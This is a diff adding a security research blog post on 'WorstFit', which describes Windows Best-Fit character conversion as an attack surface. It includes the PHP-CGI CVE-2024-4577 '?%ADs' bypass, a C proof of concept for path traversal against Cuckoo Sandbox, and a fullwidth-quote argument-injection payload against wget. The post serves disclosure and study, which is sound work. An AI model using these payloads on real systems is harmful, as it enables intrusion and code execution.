+
+&lt;h2 id=&quot;it-was-the-worst-of-fit--the-novel-attack-surface-on-windows&quot;&gt;It was the Worst of Fit – The novel attack surface on Windows&lt;/h2&gt;
+
+&lt;p&gt;By delving into the Best-Fit feature, we can harness this unexpected character transformation as a brand-new attack surface on Windows systems. Here, we’ll explore three intriguing attack techniques that exploit this behavior: &lt;strong&gt;Filename Smuggling&lt;/strong&gt;, &lt;strong&gt;Argument Splitting&lt;/strong&gt; and &lt;strong&gt;Environment Variable Confusion&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Let’s dive into each of these techniques to see how this seemingly thoughtful (at least, from Microsoft’s perspective at the time) feature can lead to critical vulnerabilities!&lt;/p&gt;
+
+&lt;h3 id=&quot;-the-nightmare-of-east-asia---cve-2024-4577&quot;&gt;🔥 The nightmare of East-Asia - CVE-2024-4577:&lt;/h3&gt;
+
+&lt;p&gt;The first ever WorstFit attack is CVE-2024-4577. This vulnerability allows attackers to compromise any PHP-CGI server configured with Chinese or Japanese code pages using nothing more than a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?%ADs&lt;/code&gt; request!&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;Affected Code Pages&lt;/strong&gt;: 932 (Japanese), 936 (Simplified Chinese), 950 (Traditional Chinese)&lt;br /&gt;
+&lt;strong&gt;Threat Characters&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;shy;&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+00AD&quot;&gt;U+00AD&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Back in 2012, a vulnerability in PHP-CGI was discovered. The issue stemmed from Apache automatically treating the query string as the first argument for the CGI program. Exploitation was straightforward – argument injection. By appending &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?-s&lt;/code&gt; to a request, attackers could leak the page’s source code. Furthermore, it’s also possible to achieve Remote Code Execution (RCE).&lt;/p&gt;
+
+&lt;p&gt;Of course, PHP quickly patched the issue. The fix was also simple: stop parsing arguments if the query string starts with a dash.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;QUERY_STRING&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;=&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+   &lt;span class=&quot;cm&quot;&gt;/* ... omitted ... */&lt;/span&gt;
+   &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decoded_qs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* skip leading spaces */&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;-&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;skip_getopt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+   &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;cm&quot;&gt;/* ... omitted ... */&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The patch worked well, and no one broke it for the past 12 years. However, while reviewing the patch, we couldn’t help but feel that this blacklist approach seemed weak. After some quick fuzzing, we discovered a simple bypass: appending &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?%ADs&lt;/code&gt; to the query string effortlessly!&lt;/p&gt;
+
+&lt;p&gt;As investigating more, we discovered that U+00AD (soft hyphen) is mapped to a dash (-) on Chinese (936, 950) and Japanese (932) code pages due to &lt;strong&gt;Best-Fit&lt;/strong&gt; behavior, which explains how the bypass works.&lt;/p&gt;
+
+&lt;p&gt;This is the first time we’ve encountered the term “Best-Fit”. We found it super interesting, which motivated us to take a deeper look.&lt;/p&gt;
+
+&lt;h3 id=&quot;-filename-smuggling&quot;&gt;🔥 Filename Smuggling&lt;/h3&gt;
+
+&lt;p&gt;The next attack we would like to introduce is the WorstFit in the filename processing. Here, we focus on characters that mapped to either &lt;strong&gt;”/” (0x2F)&lt;/strong&gt; or &lt;strong&gt;”\” (0x5C)&lt;/strong&gt;, such as the currency symbol &lt;a href=&quot;https://en.wikipedia.org/wiki/Won_sign&quot;&gt;Yen (¥)&lt;/a&gt;, and &lt;a href=&quot;https://en.wikipedia.org/wiki/Yen_and_yuan_sign&quot;&gt;Won (₩)&lt;/a&gt; used in Japanese and Korean Code Pages, as well as the &lt;a href=&quot;https://en.wikipedia.org/wiki/Halfwidth_and_Fullwidth_Forms_(Unicode_block)&quot;&gt;fullwidth&lt;/a&gt; version of the (back-)slash in most Code Pages. You can check the affected characters and Code Pages on our &lt;a href=&quot;https://worst.fit/mapping/&quot;&gt;Best-fit Mapping Grepper&lt;/a&gt; tool!&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://worst.fit/mapping/#to%3A0x2f&quot;&gt;Characters mapped to “/” (0x2F)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://worst.fit/mapping/#to%3A0x5c&quot;&gt;Characters mapped to “\” (0x5C)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;Relevant API&lt;/strong&gt;: &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcurrentdirectory&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCurrentDirectoryA&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getcwd&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfilea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FindFirstFileA&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/findfirst-functions?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;findfirst*&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfullpathnamea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetFullPathNameA&lt;/code&gt;&lt;/a&gt;, …&lt;br /&gt;
+&lt;strong&gt;Affected Code Pages&lt;/strong&gt;: 874, 125x, 932 (JP), 949 (KR)&lt;br /&gt;
+&lt;strong&gt;Threat Characters&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;／&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+FF0F&quot;&gt;U+FF0F&lt;/a&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;＼&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+FF3C&quot;&gt;U+FF3C&lt;/a&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;¥&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+00A5&quot;&gt;U+00A5&lt;/a&gt; (JP), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;₩&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+20A9&quot;&gt;U+20A9&lt;/a&gt; (KR)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Let’s start with a simple case. In Chrome V8, the underlying implementation of its Developer Shell (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;d8.exe&lt;/code&gt;) uses the ANSI API &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCurrentDirectoryA()&lt;/code&gt; to obtain the current working directory. This means that if we can have a working direcotry with malicious Unicode characters, these characters will automatically be converted into path traversal payloads when accessed via the ANSI API. As a result, it leads to an unintended file access.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/4.png&quot; alt=&quot;&quot; /&gt;
+&lt;em&gt;↑ Unintended file access on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:/windows/win.ini&lt;/code&gt;:&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Another case is the implementation of mruby &lt;a href=&quot;https://github.com/mruby/mruby/blob/3.3.0/mrbgems/mruby-dir/src/dir.c#L23&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dir.getwd()&lt;/code&gt;&lt;/a&gt; on Windows, the function relied on the ANSI version of CRT (C Runtime Library) &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd-wgetcwd?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_getcwd()&lt;/code&gt;&lt;/a&gt; to retrieve the current directory. This also means that we can pollute that function’s return value, leading to Path Traversal, too!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/5.png&quot; alt=&quot;&quot; /&gt;
+&lt;em&gt;↑ Pollute the return value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dir.getwd()&lt;/code&gt;:&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Of course, the above cases are still bugs instead of real vulneraiblities. Let’s take a look at some real-world cases!&lt;/p&gt;
+
+&lt;h4 id=&quot;-case-study---path-traversal-to-rce-on-cuckoo-sandbox&quot;&gt;➤ Case Study - Path Traversal to RCE on Cuckoo Sandbox&lt;/h4&gt;
+
+&lt;p&gt;Before diving into the vulnerability, it’s important to discuss Python first because it plays a significant role in this case! Conceptually, Python allows strings to be represented in two different types: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;str&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unicode&lt;/code&gt; in Python 2, or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;str&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bytes&lt;/code&gt; in Python 3.&lt;/p&gt;
+
+&lt;p&gt;To support both string representations, the implementation of filesystem access used a structure field to determine whether a target path was wide or narrow. If the string was narrow, the corresponding ANSI API was used to process the path, making it susceptible to the Best-Fit behavior. Although &lt;a href=&quot;https://peps.python.org/pep-0529/&quot;&gt;PEP 529&lt;/a&gt; later standardized the filesystem encoding on Windows to UTF-8, earlier versions — such as Python 2 and Python 3 (prior to version 3.6) — remained vulnerable to WorstFit attacks.&lt;/p&gt;
+
+&lt;p&gt;With the above context in mind, let’s have our first target — &lt;a href=&quot;https://cuckoosandbox.org/index.html&quot;&gt;Cuckoo Sandbox&lt;/a&gt;, a well-known automated malware analysis platform. As one of the few open-source solutions for malware analysis in early days, it was the go-to choice for organizations building their own platforms, and for malware researchers seeking to extend its functionality. However, since Cuckoo has not been actively maintained for many years, the latest official version still relies on Python 2.7, which exposes it to our WorstFit Attack!&lt;/p&gt;
+
+&lt;p&gt;Cuckoo consists of two main components: the &lt;strong&gt;Cuckoo Host&lt;/strong&gt; and the &lt;strong&gt;VM Cluster&lt;/strong&gt;. The uploaded samples are isolated within virtual machines to ensure they do not affect the Cuckoo. The components use a dedicated channel to synchronize the behaviors such as captured network packets, dropped files, and output logs with their own mechanism. However, since the Cuckoo Host is written in Python and relied on an outdated version, a dropped file with a Unicode filename can traverse the path on the Cuckoo Host!&lt;/p&gt;
+
+&lt;p&gt;Here’s a simple Proof of Concept:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;LPCWSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filePath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;L&quot;AAAA\u00a5..\u00a5..\u00a5..\u00a5..\u00a5..\u00a5conf\u00a5cuckoo.conf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateFileW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;filePath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GENERIC_WRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CREATE_ALWAYS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILE_ATTRIBUTE_NORMAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    
+    &lt;span class=&quot;n&quot;&gt;CloseHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once the analysis has finished, users can view the logs and dropped files generated by the malware through the web interface. An attacker can trigger a file operation on Python by clicking the download button. The Cuckoo Host then processes a translated path, containing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../&lt;/code&gt; and sends sensitive data to the attacker.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The attacker can then download &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cuckoo.conf&lt;/code&gt;, and gathered serveral sensitive information to calculate the Flask PIN code, ultimately achieving RCE on the Sandbox Host!&lt;/p&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/EeMcDT95WSM?si=NJ8xmmWNEICeq-d7&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;-argument-splitting&quot;&gt;🔥 Argument Splitting&lt;/h3&gt;
+
+&lt;p&gt;We can also exploit the WorstFit behavior in command line parsing by manipulating the output of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandLineA&lt;/code&gt;. With this trick, even if you can control just a small part of an argument, that’s more than enough to inject as many arguments as you want!&lt;/p&gt;
+
+&lt;p&gt;This time, we’re zeroing in on characters that map to either a double quote (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&lt;/code&gt;, 0x22) or a backslash (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;, 0x5C). Once again, fullwidth characters come in handy here, and when it comes to backslashes, those currency symbols we talked about earlier make a comeback!&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://worst.fit/mapping/#to%3A0x22&quot;&gt;Characters mapped to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; (0x22)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://worst.fit/mapping/#to%3A0x5c&quot;&gt;Characters mapped to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt; (0x5C)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;Relevant API&lt;/strong&gt;: &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandlineA&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-language/main-function-and-program-execution?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int main()&lt;/code&gt;&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Affected Code Pages&lt;/strong&gt;: 874, 125x, 932 (JP), 949 (KR)&lt;br /&gt;
+&lt;strong&gt;Threat Characters&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;＂&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+FF02&quot;&gt;U+FF02&lt;/a&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;＼&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+FF3C&quot;&gt;U+FF3C&lt;/a&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;¥&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+00A5&quot;&gt;U+00A5&lt;/a&gt; (JP), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;₩&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+20A9&quot;&gt;U+20A9&lt;/a&gt; (KR)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Let’s circle back to the piece of code we discussed earlier. How might this seemingly simple snippet fail, and more importantly, how could an attacker exploit it?&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://example.tld/&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;path&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wget.exe -q &quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;escapeshellarg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The answer is quite simple. If an attacker provides the input: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;＂ --use-askpass=calc ＂&lt;/code&gt;
+It could pop &lt;strong&gt;calc.exe&lt;/strong&gt; on the system!&lt;/p&gt;
+
+&lt;p&gt;At this point, you might be thinking, &lt;em&gt;“Oh, it’s PHP messing up again, isn’t it? I know PHP always…”&lt;/em&gt; But nope – even switching to &lt;strong&gt;Node.js&lt;/strong&gt;, &lt;strong&gt;Rust&lt;/strong&gt;, or &lt;strong&gt;Python&lt;/strong&gt; doesn’t save you. Here’s an example in Python, and the same input works like a charm – this time on the latest version of Python, not just older ones:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;flask&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/fetch&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;path&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wget&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://example.tld/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Done&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So, is this wget’s problem? Well, spoiler alert: yes, it’s part of the issue, but it doesn’t stop there. The same trick works on other executables like &lt;strong&gt;openssl.exe&lt;/strong&gt;, &lt;strong&gt;tar.exe&lt;/strong&gt;, &lt;strong&gt;java.exe&lt;/strong&gt;, and more CLI tools. This makes us realize, this can actually be a broader systemic issue with how argument handling works on Windows, creating an attack surface across various tools. So, how does it happen?&lt;/p&gt;
+
+&lt;p&gt;Let’s back to our payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;＂ --use-askpass=calc ＂&lt;/code&gt;. I guess now some of you might still be wondering: &lt;em&gt;Wait, how does a simple double quote bypass the escaping? What exactly does it escape, then?&lt;/em&gt; Well, first of all, these aren’t just regular double quotes (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+0022&lt;/code&gt;) — they’re actually &lt;strong&gt;fullwidth double quotes&lt;/strong&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+FF02&lt;/code&gt;) 😉. Thanks to the Best-Fit feature, in code pages like 125x and 874, fullwidth double quotes are automatically converted into standard double quotes (&lt;a href=&quot;https://worst.fit/mapping/#from%3A0xFF02%20to%3A0x22&quot;&gt;🔍&lt;/a&gt;).&lt;/p&gt;
+
+&lt;p&gt;But still, why can these double quotes alter the arguments?&lt;/p&gt;
+
